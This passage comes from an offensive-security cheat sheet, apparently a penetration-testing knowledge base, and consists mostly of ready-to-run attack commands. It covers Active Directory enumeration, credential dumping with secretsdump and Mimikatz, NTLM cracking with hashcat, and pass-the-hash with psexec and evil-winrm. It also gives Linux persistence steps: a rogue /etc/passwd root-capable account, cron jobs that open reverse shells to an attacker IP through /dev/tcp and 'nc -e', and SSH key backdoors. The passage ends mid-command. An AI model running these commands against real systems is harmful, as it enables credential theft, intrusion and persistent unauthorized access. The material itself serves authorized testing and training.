[DOMAIN]/[USERNAME]:[PASSWORD] -request -dc-ip [IP-ADDRESS]\n</code></pre></p> </li> <li> <p>Request TGT using Kerberos authentication <pre><code>GetNPUsers.py -k [DOMAIN]/[USERNAME] -request -dc-ip [IP-ADDRESS]\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/Impacket-Toolkit/#ntlm","title":"NTLM","text":"<p>lookupsid.py : Enumerate domain SID information.</p> <ol> <li> <p>Enumerate domain SID info <pre><code>lookupsid.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]\n</code></pre></p> </li> <li> <p>Enumerate domain SID info using Pass-the-Hash <pre><code>lookupsid.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]\n</code></pre></p> </li> <li> <p>Enumerate domain SID info with no credentials <pre><code>lookupsid.py -no-pass [DOMAIN]/[USERNAME]@[IP-ADDRESS]\n</code></pre></p> </li> </ol> <p>secretsdump.py : Dump secrets from remote machines.</p> <ol> <li> <p>Dump secrets from a remote machine <pre><code>secretsdump.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]\n</code></pre></p> </li> <li> <p>Dump secrets from the domain controller <pre><code>secretsdump.py -just-dc-user [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]\n</code></pre></p> </li> <li> <p>Dump secrets using Pass-the-Hash <pre><code>secretsdump.py -hashes [LMHASH]:[NTHASH] [DOMAIN]/[USERNAME]@[IP-ADDRESS]\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Windows/PowerShell/","title":"PowerShell","text":""},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Windows/PowerShell/#introduction","title":"Introduction","text":"<p>PowerShell, released by Microsoft in 2006, is a powerful upgrade to Command Prompt. It includes access to cmdlets (pronounced command-lets), which are .NET classes designed to perform specific functions. This cheat sheet focuses on using PowerShell for Active Directory (AD) enumeration, leveraging cmdlets included with the AD-RSAT (Active Directory Remote Server Administration Tools) package.</p>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Windows/PowerShell/#enumerating-ad-users","title":"Enumerating AD Users","text":"<ol> <li> <p>Retrieve AD user details with all properties <pre><code>Get-ADUser -Identity gordon.stevens -Server za.example.com -Properties *\n</code></pre></p> </li> <li> <p>Use filters to narrow down user search <pre><code>Get-ADUser -Filter 'Name -like \"*Roland\"' -Server za.example.com | Format-Table Name,SamAccountName -A\n</code></pre></p> </li> <li> <p>List all users in the domain <pre><code>Get-ADUser -Filter * -Server za.example.com | Format-Table Name,SamAccountName -AutoSize\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Windows/PowerShell/#enumerating-ad-groups","title":"Enumerating AD Groups","text":"<ol> <li> <p>Retrieve AD group details <pre><code>Get-ADGroup -Identity Administrators -Server za.example.com\n</code></pre></p> </li> <li> <p>Enumerate group membership <pre><code>Get-ADGroupMember -Identity Administrators -Server za.example.com\n</code></pre></p> </li> <li> <p>List all groups in the domain <pre><code>Get-ADGroup -Filter * -Server za.example.com | Format-Table Name,GroupScope -AutoSize\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Windows/PowerShell/#enumerating-ad-computers","title":"Enumerating AD Computers","text":"<ol> <li> <p>Retrieve AD computer details with all properties <pre><code>Get-ADComputer -Identity \"DC01\" -Server za.example.com -Properties *\n</code></pre></p> </li> <li> <p>Use filters to narrow down computers by OS <pre><code>Get-ADComputer -Filter 'OperatingSystem -like \"*Server*\"' -Server za.example.com | Format-Table Name,OperatingSystem -A\n</code></pre></p> </li> <li> <p>List all computers in the domain <pre><code>Get-ADComputer -Filter * -Server za.example.com | Format-Table Name,OperatingSystem -AutoSize\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Windows/PowerShell/#enumerating-ad-objects","title":"Enumerating AD Objects","text":"<ol> <li> <p>Search for objects changed after a specific date <pre><code>$ChangeDate = New-Object DateTime(2024, 05, 25, 12, 00, 00)\nGet-ADObject -Filter 'whenChanged -gt $ChangeDate' -IncludeDeletedObjects -Server za.example.com\n</code></pre></p> </li> <li> <p>List all AD objects <pre><code>Get-ADObject -Filter * -Server za.example.com | Format-Table Name,ObjectClass -AutoSize\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Windows/PowerShell/#enumerating-domains","title":"Enumerating Domains","text":"<ol> <li>Retrieve detailed domain information <pre><code>Get-ADDomain -Server za.example.com\n</code></pre></li> <li>Enumerate organizational units (OUs) <pre><code>Get-ADOrganizationalUnit -Filter * -Server za.example.com | Format-Table Name,DistinguishedName -A\n</code></pre></li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Windows/PowerView/","title":"PowerView","text":""},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Windows/PowerView/#enumerate-domain-information","title":"Enumerate Domain Information","text":"<ol> <li> <p>Retrieve detailed information about a domain user <pre><code>Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name, samaccountname, description, memberof, whencreated, pwdlastset, lastlogontimestamp, accountexpires, admincount, userprincipalname, serviceprincipalname, useraccountcontrol\n</code></pre></p> </li> <li> <p>List members of the \"Domain Admins\" group (including nested memberships) <pre><code>Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse\n</code></pre></p> </li> <li> <p>List trust relationships for the domain <pre><code>Get-DomainTrustMapping\n</code></pre></p> </li> <li> <p>Check administrative access to a specific machine <pre><code>Test-AdminAccess -ComputerName ACADEMY-EA-MS01\n</code></pre></p> </li> <li> <p>Identify users with SPN property set (useful for Kerberoasting) <pre><code>Get-DomainUser -SPN -Properties samaccountname, ServicePrincipalName\n</code></pre></p> </li> <li> <p>Enumerate local groups on a target <pre><code>Get-NetLocalGroup -ComputerName &lt;target&gt;\n</code></pre></p> </li> <li> <p>Enumerate members of the local Administrators group on a target <pre><code>Get-NetLocalGroupMember -ComputerName &lt;target&gt; -GroupName \"Administrators\"\n</code></pre></p> </li> <li> <p>Enumerate shares on a target <pre><code>Get-NetShare -ComputerName &lt;target&gt;\n</code></pre></p> </li> <li> <p>Find reachable shares on domain machines <pre><code>Find-DomainShare\n</code></pre></p> </li> <li> <p>Search for files matching criteria on readable shares <pre><code>Find-InterestingDomainShareFile\n</code></pre></p> </li> <li> <p>List all distributed file systems for the domain <pre><code>Get-DomainDFSShare\n</code></pre></p> </li> <li> <p>Retrieve default domain or DC policy <pre><code>Get-DomainPolicy\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Windows/PowerView/#domain-information","title":"Domain Information","text":"<ol> <li> <p>Get current domain <pre><code>Get-NetDomain\n</code></pre></p> </li> <li> <p>Enumerate other domains <pre><code>Get-NetDomain -Domain $DomainName\n</code></pre></p> </li> <li> <p>Get domain SID <pre><code>Get-DomainSID\n</code></pre></p> </li> <li> <p>Retrieve domain policy <pre><code>Get-DomainPolicy\n(Get-DomainPolicy).\"system access\"\n(Get-DomainPolicy).\"kerberos policy\"\n</code></pre></p> </li> <li> <p>Get domain controllers <pre><code>Get-NetDomainController\nGet-NetDomainController -Domain $DomainName\n</code></pre></p> </li> <li> <p>Get detailed domain info <pre><code>Get-NetDomain -FullData\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Windows/PowerView/#enumerate-domain-users","title":"Enumerate Domain Users","text":"<ol> <li> <p>Enumerate domain users <pre><code>Get-NetUser\nGet-NetUser -SamAccountName $user\nGet-NetUser | select cn\nGet-UserProperty\n</code></pre></p> </li> <li> <p>Check last password change <pre><code>Get-UserProperty -Properties pwdlastset\n</code></pre></p> </li> <li> <p>Get specific attribute value <pre><code>Find-UserField -SearchField Description -SearchTerm \"wtver\"\n</code></pre></p> </li> <li> <p>Enumerate users logged onto a machine <pre><code>Get-NetLoggedon -ComputerName $ComputerName\n</code></pre></p> </li> <li> <p>Enumerate session information <pre><code>Get-NetSession -ComputerName $ComputerName\n</code></pre></p> </li> <li> <p>Enumerate user locations <pre><code>Find-DomainUserLocation -Domain $DomainName | Select-Object UserName, SessionFromName\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Windows/PowerView/#enumerate-domain-computers","title":"Enumerate Domain Computers","text":"<ol> <li> <p>Enumerate domain computers <pre><code>Get-NetComputer -FullData\nGet-NetComputer -Ping\n</code></pre></p> </li> <li> <p>Enumerate live machines <pre><code>Get-NetComputer -Ping\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Windows/PowerView/#enumerate-groups-and-group-members","title":"Enumerate Groups and Group Members","text":"<ol> <li> <p>Enumerate group members <pre><code>Get-NetGroupMember -GroupName \"$GroupName\" -Domain $DomainName\n</code></pre></p> </li> <li> <p>Get group members <pre><code>Get-DomainGroup -Identity $GroupName | Select-Object -ExpandProperty Member\n</code></pre></p> </li> <li> <p>Enumerate GPO local group membership <pre><code>Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName\n</code></pre></p> </li> <li> <p>Enumerate all groups <pre><code>Get-NetGroup -FullData\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Windows/PowerView/#enumerate-shares","title":"Enumerate Shares","text":"<ol> <li> <p>Enumerate domain shares <pre><code>Find-DomainShare\n</code></pre></p> </li> <li> <p>Enumerate accessible domain shares <pre><code>Find-DomainShare -CheckShareAccess\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Windows/PowerView/#enumerate-group-policies","title":"Enumerate Group Policies","text":"<ol> <li> <p>Get group policies <pre><code>Get-NetGPO\n</code></pre></p> </li> <li> <p>Get group policy for a machine <pre><code>Get-NetGPO -ComputerName $ComputerName\n</code></pre></p> </li> <li> <p>Get local admin group users <pre><code>Find-GPOComputerAdmin -ComputerName $ComputerName\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Windows/PowerView/#enumerate-ous","title":"Enumerate OUs","text":"<ol> <li>Enumerate organizational units <pre><code>Get-NetOU -FullData\nGet-NetGPO -GPOname $GPO_GUID\n</code></pre></li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Windows/PowerView/#enumerate-acls","title":"Enumerate ACLs","text":"<ol> <li> <p>Get ACLs for a user <pre><code>Get-ObjectAcl -SamAccountName $UserName -ResolveGUIDs\n</code></pre></p> </li> <li> <p>Get ACLs for a specific path <pre><code>Get-PathAcl -Path $Path\n</code></pre></p> </li> <li> <p>Search for interesting ACEs <pre><code>Invoke-ACLScanner -ResolveGUIDs\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Windows/PowerView/#enumeration-of-data","title":"Enumeration of Data","text":"<ol> <li> <p>Enumerate domain trusts <pre><code>Get-NetDomainTrust\nGet-NetDomainTrust -Domain $DomainName\n</code></pre></p> </li> <li> <p>Enumerate forest trusts <pre><code>Get-NetForestTrust\nGet-NetForestDomain -Forest $ForestName\n</code></pre></p> </li> <li> <p>Get DNS zones and records <pre><code>Get-DNSZone\nGet-DNSRecord\n</code></pre></p> </li> <li> <p>Get all domain sites and subnets <pre><code>Get-NetSite\nGet-NetSubnet\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Windows/SharpView/","title":"SharpView","text":""},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Windows/SharpView/#enumerating-ad-users","title":"Enumerating AD Users","text":"<ol> <li> <p>Enumerate AD users <pre><code>SharpView.exe Get-DomainUser -Identity gordon.stevens -Domain [DOMAIN]\n</code></pre></p> </li> <li> <p>Use filters to narrow user search <pre><code>SharpView.exe Get-DomainUser -Filter \"samaccountname -like '*[USERNAME]*'\" -Domain [DOMAIN]\n</code></pre></p> </li> <li> <p>List all AD users <pre><code>SharpView.exe Get-DomainUser -Domain [DOMAIN]\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Windows/SharpView/#enumerating-ad-groups","title":"Enumerating AD Groups","text":"<ol> <li> <p>Enumerate AD groups <pre><code>SharpView.exe Get-DomainGroup -Identity Administrators -Domain [DOMAIN]\n</code></pre></p> </li> <li> <p>Enumerate group membership <pre><code>SharpView.exe Get-DomainGroupMember -Identity Administrators -Domain [DOMAIN]\n</code></pre></p> </li> <li> <p>List all AD groups <pre><code>SharpView.exe Get-DomainGroup -Domain [DOMAIN]\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Windows/SharpView/#enumerating-ad-computers","title":"Enumerating AD Computers","text":"<ol> <li> <p>Enumerate AD computers <pre><code>SharpView.exe Get-DomainComputer -Identity \"DC01\" -Domain [DOMAIN]\n</code></pre></p> </li> <li> <p>Use filters to narrow computer search <pre><code>SharpView.exe Get-DomainComputer -Filter \"operatingsystem -like '*Server*'\" -Domain [DOMAIN]\n</code></pre></p> </li> <li> <p>List all AD computers <pre><code>SharpView.exe Get-DomainComputer -Domain [DOMAIN]\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Windows/SharpView/#enumerating-ad-objects","title":"Enumerating AD Objects","text":"<ol> <li> <p>Perform generic AD object searches <pre><code>SharpView.exe Get-DomainObject -Filter \"whenchanged -gt 2024-02-28T12:00:00\" -Domain [DOMAIN]\n</code></pre></p> </li> <li> <p>List all AD objects <pre><code>SharpView.exe Get-DomainObject -Domain [DOMAIN]\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Windows/SharpView/#enumerating-domains","title":"Enumerating Domains","text":"<ol> <li> <p>Retrieve detailed domain information <pre><code>SharpView.exe Get-Domain -Domain [DOMAIN]\n</code></pre></p> </li> <li> <p>Enumerate organizational units (OUs) <pre><code>SharpView.exe Get-DomainOU -Domain [DOMAIN]\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Windows/SharpView/#enumerating-group-policy-objects-gpos","title":"Enumerating Group Policy Objects (GPOs)","text":"<ol> <li>Retrieve Group Policy Objects in the domain <pre><code>SharpView.exe Get-DomainGPO -Domain [DOMAIN]\n</code></pre></li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Windows/SharpView/#enumerating-trusts","title":"Enumerating Trusts","text":"<ol> <li>Retrieve domain trust information <pre><code>SharpView.exe Get-DomainTrust -Domain [DOMAIN]\n</code></pre></li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Windows/SharpView/#enumerating-domain-controllers","title":"Enumerating Domain Controllers","text":"<ol> <li>Retrieve domain controller information <pre><code>SharpView.exe Get-DomainController -Domain [DOMAIN]\n</code></pre></li> </ol>"},{"location":"Offensive-Security/Active-Directory/Lateral-Movement/Certificate/","title":"Certificate","text":"<p>todo</p>"},{"location":"Offensive-Security/Active-Directory/Lateral-Movement/Kerberos/","title":"Kerberos","text":"<p>todo</p>"},{"location":"Offensive-Security/Active-Directory/Lateral-Movement/Mimikatz/","title":"Mimikatz","text":""},{"location":"Offensive-Security/Active-Directory/Lateral-Movement/Mimikatz/#prerequisites","title":"PREREQUISITES:","text":"<ul> <li>The attacker must have an account or a shell on the target server.</li> <li>The attacker requires administrative privileges.</li> </ul>"},{"location":"Offensive-Security/Active-Directory/Lateral-Movement/Mimikatz/#extracting-ntlm-hashes-with-mimikatz","title":"EXTRACTING NTLM HASHES WITH MIMIKATZ","text":"<ol> <li> <p>To check which users exist locally on the system, run: <code>Get-LocalUser</code></p> </li> <li> <p>Navigate to the Mimikatz directory and start Mimikatz with: <code>.\\mimikatz.exe</code> </p> </li> </ol> NOTE <p>Administrative privileges are required.</p> <ol> <li> <p>Enable the debug privilege using: <code>privilege::debug</code></p> </li> <li> <p>Elevate privileges to SYSTEM using: <code>token::elevate</code></p> </li> <li> <p>Extract NTLM hashes from the SAM database: <code>lsadump::sam</code> <code>lsadump::lsa /patch</code></p> </li> <li> <p>Dump Credentials of All Logged-On Users:  <code>sekurlsa::logonpasswords</code></p> </li> </ol> NOTE <p>This command will dump hashes for all users logged on to the current workstation or server, including remote logins like Remote Desktop sessions.    </p>"},{"location":"Offensive-Security/Active-Directory/Lateral-Movement/Mimikatz/#cracking-ntlm-hashes-with-hashcat","title":"CRACKING NTLM HASHES WITH HASHCAT","text":"<ol> <li> <p>Save the NTLM hash to a file (e.g., <code>NTLM.hash</code>) using: <code>echo \"3ae8e5f0ffabb3a627672e1600f1ba10\" &gt; NTLM.hash</code></p> </li> <li> <p>Identify the Correct Hashcat Mode for NTLM:   <code>hashcat --help | grep -i \"ntlm\"</code> NOTE: The output should indicate mode <code>1000</code> for NTLM.</p> </li> <li> <p>Start the Cracking Process with Hashcat:  <code>hashcat -m 1000 NTLM.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</code></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Lateral-Movement/NTHash/","title":"NT Hash","text":""},{"location":"Offensive-Security/Active-Directory/Lateral-Movement/NTHash/#introduction","title":"INTRODUCTION","text":"<p>NTLMv1, NTLMv2 and NThash are all confusing terms and used interchangeably but let\u2019s settle this once and for all:</p> <ol> <li>NTHash: this is the hash of the password stored in the system in SAM hive and in active directory networks in the NTDS file.</li> <li>NTLMv1: this is a challenge/response protocol to authenticate to a system using the NTHash.</li> <li>NTLMv2: this is the newer version of the NTLM protocol with some adjustments but the same concept.</li> </ol> <p>Now that we\u2019ve settled this, let\u2019s get back to business.</p>"},{"location":"Offensive-Security/Active-Directory/Lateral-Movement/NTHash/#pass-the-hash","title":"PASS-THE-HASH","text":"<p>PtH or Pass-the-Hash attack is an attack where the attacker passes NTHash to systems instead of passwords. Remember NTLM? We as an end user type our password and let the system send it through a hashing algorithm to become NTHash and then send that to NTLM to authenticate us to the target system. Now in PtH, instead of typing the password and letting the system make a hash out of it for us, we pass the already found NThash, skipping those steps before authentication.</p> <p><code>crackmapexec smb 192.168.154.171 -u 'ted' -d 'exam.com' -H ':31aa99ebd6ea4b6d07051acfd48efa35' --shares</code></p> <p><code>impacket-psexec -hashes \":d098fa8675acd7d26ab86eb2581233e5\" exam.com/zensvc@192.168.154.170</code></p> <p><code>impacket-psexec -hashes \":d098fa8675acd7d26ab86eb2581233e5\"zensvc@192.168.154.170</code></p> <p><code>evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6</code></p>"},{"location":"Offensive-Security/Active-Directory/Lateral-Movement/Password/","title":"Password","text":""},{"location":"Offensive-Security/Active-Directory/Lateral-Movement/Password/#winrm","title":"WINRM","text":"<p>WinRM is a management protocol used to remotely communicate with another system in the Windows realm. You can pass the password to this service to gain access if it\u2019s enabled: <code>evil-winrm -i 'TARGET-IP' -u 'USERNAME' -p 'PASSWORD'</code> In this scenario we have a password which we passed to WinRM using the \u2018evil-winrm\u2019 tool.</p>"},{"location":"Offensive-Security/Active-Directory/Lateral-Movement/Password/#rdp","title":"RDP","text":"<p>RDP is a protocol to remotely control desktop computers. Once again we can pass our password to this service if enabled, In this scenario we\u2019ve used \u2018xfreerdp\u2019 to talk with the RDP protocol and gained access to the system through a graphical interface. <code>xfreerdp /v:TARGET-IP /u:USERNAME /p:'PASSWORD' /drive:linux,/home/kali/yo/SessionGopher</code></p>"},{"location":"Offensive-Security/Active-Directory/Lateral-Movement/Password/#mssql","title":"MSSQL","text":"<p>We can also pass the password to MSSQL service if enabled and authorized to exfiltrate sensitive information out of the network or to execute OS commands. To check if MSSQL is enabled on the target system: <code>crackmapexec mssql TARGET-IP -u 'USERNAME' -p 'PASSWORD'</code></p>"},{"location":"Offensive-Security/Active-Directory/Lateral-Movement/Password/#smb","title":"SMB","text":"<p>SMB is a file sharing protocol widely used in the Windows realm. To check if authorized: <code>crackmapexec smb TARGER-IP -u 'USERNAME' -p 'PASSWORD'</code></p> <p>To list shared folders: <code>smbclient -U 'USERNAME' -L \\\\TARGET-IP</code></p> <p>And finally to connect to the target share which in our case is \u2018Users\u2019: <code>smbclient -U 'USERNAME' \\\\\\\\TARGET-IP\\\\SHARE</code></p>"},{"location":"Offensive-Security/Active-Directory/Lateral-Movement/Password/#interactive-shell","title":"INTERACTIVE-SHELL","text":"<p>Several tools can provide an interactive shell by exploiting protocols like SMB. One commonly used tool is psexec from the Impacket toolkit:</p> <p><code>/usr/bin/impacket-psexec 'USERNAME:PASSWORD@TARGET-IP'</code> WHAT IT DOES: The tool locates a writable SMB share on the target, uploads a payload (typically a service binary), creates a new service to run it, and starts that service. This process gives us a shell with NT AUTHORITY\\SYSTEM privileges.</p> <p>There are also other tools that can do magic like that: <code>impacket-smbexec 'USERNAME:PASSWORD'@TARGET-IP</code></p> <p>And \u2018wmiexec\u2019: <code>impacket-wmiexec 'USERNAME:PASSWORD'@TARGET-IP</code></p>"},{"location":"Offensive-Security/Linux-Environment/Making-Shell-Fully-Interactive/","title":"Making Shell Fully Interactive","text":""},{"location":"Offensive-Security/Linux-Environment/Making-Shell-Fully-Interactive/#introduction","title":"Introduction","text":"<p>When you find yourself with a low-privilege shell, upgrading it to a fully interactive shell is crucial. Here\u2019s a guide to making your shell fully interactive, including initial steps and additional tips for a smooth experience.</p>"},{"location":"Offensive-Security/Linux-Environment/Making-Shell-Fully-Interactive/#step-1-upgrade-the-shell","title":"Step 1: Upgrade the Shell","text":"<ol> <li> <p>Check the availability of Python versions:.\u00a0 <code>which python python2 python3</code></p> </li> <li> <p>Upgrade the Shell Using Python 2: <code>python2 -c 'import pty; pty.spawn(\"/bin/bash\")'</code></p> </li> <li> <p>Upgrade the Shell Using Python 3: <code>python3 -c 'import pty; pty.spawn(\"/bin/bash\")'</code></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Making-Shell-Fully-Interactive/#step-2-set-path-and-term-variables","title":"Step 2: Set PATH and TERM Variables","text":"<p>Next, set the <code>PATH</code> and <code>TERM</code> environment variables to ensure proper functionality of shell commands and terminal capabilities:</p> <ol> <li>Set the PATH: <code>export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp</code></li> <li>Set the TERM: <code>export TERM=xterm-256color</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Making-Shell-Fully-Interactive/#step-3-handle-background-processes","title":"Step 3: Handle Background Processes","text":"<p>If you need to suspend the current shell process and bring it to the foreground later, use the following key combinations and commands:</p> <ol> <li>Press <code>Ctrl + Z</code> to suspend the current process and return to the parent shell.</li> <li>Enter raw mode and bring the process back to the foreground: <code>stty raw -echo; fg</code></li> <li>Reset the terminal settings to a sane state: <code>reset</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Making-Shell-Fully-Interactive/#step-4-set-shell-and-terminal-size","title":"Step 4: Set Shell and Terminal Size","text":"<p>Adjust the terminal window size for better readability and to avoid display issues:</p> <ol> <li>Set the terminal size: <code>stty columns 200 rows 200</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Making-Shell-Fully-Interactive/#bypassing-restricted-bash-environments","title":"Bypassing Restricted Bash Environments","text":"<p>Use the following commands to bypass restricted bash environments:</p> <ol> <li>Using Perl: <code>perl -e 'exec \"/bin/sh\";'</code></li> <li>Using a shell: <code>/bin/sh -i</code></li> <li>Using the exec function: <code>exec \"/bin/sh\";</code></li> <li>Using echo with os.system: <code>echo os.system('/bin/bash')</code></li> <li>Using netcat with SSH: <code>/bin/sh -i</code></li> <li>Using netcat with SSH: <code>ssh [USER]@[IP-ADRESS] nc $[LOCALIP] 4444 -e /bin/sh</code></li> <li>Exporting TERM: <code>export TERM=linux</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Establishing-Persistence/Add-Account/","title":"Add Account","text":""},{"location":"Offensive-Security/Linux-Environment/Establishing-Persistence/Add-Account/#step-1-generate-a-password","title":"Step 1. Generate a Password","text":"<ol> <li> <p>Generate a hashed password using OpenSSL. Replace [SALT] and [PASSWORD] with your chosen salt and password. <code>openssl passwd -1 -salt [SALT] [PASSWORD]</code></p> <p></p> </li> <li> <p>Understand the /etc/passwd file structure. Each line represents a user and is formatted as follows: <code>$UserName:$generated_password:$UID:$GUID:$comment:$home_dir:$default_shell</code></p> <ul> <li><code>$generated_password:</code> The hashed password generated in the previous step.</li> <li><code>$UID:</code> User ID, a unique number assigned to each user.</li> <li><code>$GUID:</code> Group ID, a unique number assigned to each group.</li> <li><code>$comment:</code> Usually the user full name.</li> <li><code>$home_dir:</code> The path to the user's home directory.</li> <li><code>$default_shell:</code> The default shell for the user.</li> <li>Create a new entry in the /etc/passwd file using the generated password hash. Ensure you follow the local standards of the file format: <code>hackfast:$1$mysalt$hREc3A9Q3vWq/TYxhRgW80:1001:1001:Hackfast User:/home/hackfast:/bin/bash</code></li> </ul> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Establishing-Persistence/Add-Account/#step-2-verify-the-new-entry","title":"Step 2: Verify the New Entry","text":"<ol> <li> <p>Check the /etc/passwd file to ensure your new entry is correctly added and there are no syntax errors: <code>cat /etc/passwd | grep 'hackfast'</code> </p> <p></p> </li> <li> <p>Grant sudo privileges to the new user: <code>sudo usermod -aG sudo hackfast</code></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Establishing-Persistence/Add-Account/#step-3-alternative-method-recommended","title":"Step 3: Alternative Method (Recommended)","text":"<ol> <li> <p>Add the new user using the adduser command: <code>sudo adduser hackfast</code> </p> <p></p> <p>Follow the prompts to set the user password and other details. 2.  Grant administrative (sudo) privileges to the new user: <code>sudo usermod -aG sudo hackfast</code></p> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Establishing-Persistence/Add-Account/#step-4-test-the-new-account","title":"Step 4. Test the New Account","text":"<ol> <li>Switch to the new user to verify that the account was created successfully: <code>su - hackfast</code></li> <li>Check your identity to confirm the user switch: <code>whoami</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Establishing-Persistence/Cron-Jobs/","title":"Cron Jobs","text":""},{"location":"Offensive-Security/Linux-Environment/Establishing-Persistence/Cron-Jobs/#step-1-create-the-cron-job","title":"Step 1: Create the Cron Job","text":"<ol> <li>Open the crontab editor:     <code>crontab -e</code></li> <li>Add the following line to create a cron job that runs every 10 minutes:     <code>*/10 * * * * 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/192.168.1.102/5556; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</code></li> <li>Alternatively, use netcat for the reverse shell:     <code>*/10 * * * * nc -e /bin/sh 192.168.1.21 5556</code></li> <li>If you need to specify a user, add the user before the command:     <code>*/10 * * * * pelle /path/to/binary</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Establishing-Persistence/Cron-Jobs/#step-2-verify-the-cron-job","title":"Step 2: Verify the Cron Job","text":"<ol> <li>Check if the cron service is active:     <code>service crond status</code></li> <li>If the cron service is not started, start it:     <code>service crond start</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Establishing-Persistence/Cron-Jobs/#step-3-set-up-a-netcat-listener","title":"Step 3: Set Up a Netcat Listener","text":"<ol> <li>On your local machine, set up a netcat listener to catch the reverse shell connection:     <code>nc -lvp 5556</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Establishing-Persistence/Cron-Jobs/#step-4-troubleshooting-and-verification","title":"Step 4: Troubleshooting and Verification","text":"<ol> <li>Verify that the cron job is running:     <code>crontab -l</code></li> <li>Check the status of the cron service again if needed:     <code>service crond status</code> <code>pgrep cron</code></li> <li>Ensure your netcat listener is ready and waiting for connections:     <code>nc -lvp 5556</code></li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Establishing-Persistence/SSH-PERSISTENCE/","title":"SSH Persistence","text":""},{"location":"Offensive-Security/Linux-Environment/Establishing-Persistence/SSH-PERSISTENCE/#step-1-generate-ssh-keys","title":"Step 1. Generate SSH Keys","text":"<ol> <li>Generate an SSH key pair on your local machine: <code>ssh-keygen -t rsa -b 4096 -f ~/.ssh/persistence_key</code><ul> <li><code>-t rsa</code>: Specifies the type of key to create (RSA).</li> <li><code>-b 4096</code>: Specifies the number of bits in the key.</li> <li><code>-f ~/.ssh/persistence_key</code>: Specifies the file in which to save the key.</li> </ul> </li> </ol>"},{"location":"Offensive-Security/Linux-Environment/Establishing-Persistence/SSH-PERSISTENCE/#step-2-copy-the-public-key-to-the-target-machine","title":"Step 2. Copy the Public Key to the Target Machine","text":"<ol> <li>Copy the public key to the target machine using SSH:     <code>ssh-copy-id -i ~/.ssh/persistence_key.pub user@target_machine</code></li> <li>Alternatively, manually add the public key to the target machine <code>~/.ssh/authorized_keys</code> file: <code>cat ~/.ssh/persistence_key.pub | ssh user@target_machine \"mkdir -p ~/.ssh &amp;&amp; cat 